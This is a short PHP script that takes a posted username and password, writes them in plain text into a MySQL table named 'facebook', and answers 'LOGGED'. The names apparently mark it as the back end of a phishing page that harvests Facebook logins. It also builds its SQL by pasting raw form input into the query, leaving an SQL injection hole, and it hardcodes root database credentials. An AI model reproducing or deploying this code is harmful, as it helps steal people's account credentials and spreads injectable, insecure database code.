
<?php
$servername = "localhost";
$username = "root";
$password = "root";
$dbname="test";
// Create connection
$conn=new mysqli($servername,$username,$password,$dbname);
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
  }
$sql="INSERT INTO facebook(username,pass) VALUES('".$_POST['username']."', '".$_POST['pass']."')";
if ($conn->query($sql) === TRUE) {
    echo "LOGGED";
  } else {
    echo "Error: " . $sql . "<br>" . $conn->error;
  }
$conn->close();
?>
